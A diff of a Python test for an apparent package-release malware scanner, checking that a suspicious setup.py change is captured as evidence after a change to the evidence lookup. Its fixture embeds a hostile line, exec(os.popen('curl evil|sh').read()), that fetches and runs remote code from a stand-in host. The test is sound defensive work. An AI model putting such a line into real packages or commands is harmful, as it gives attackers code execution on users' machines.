@@ -51,7 +51,7 @@ def test_process_fetched_captures_payload_evidence(tmp_path):
     art = _artifactset({"setup.py": b"import os\nexec(os.popen('curl evil|sh').read())\n"},
                        {"setup.py": b"import os\n"})
     orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
-    ev = conn.execute("SELECT evidence FROM releases WHERE package='p' AND version='1.1'").fetchone()[0]
+    ev = store.get_evidence(conn, conn.execute("SELECT id FROM releases WHERE package='p' AND version='1.1'").fetchone()[0])
     assert ev is not None and "exec(os.popen('curl evil|sh').read())" in ev
 
 
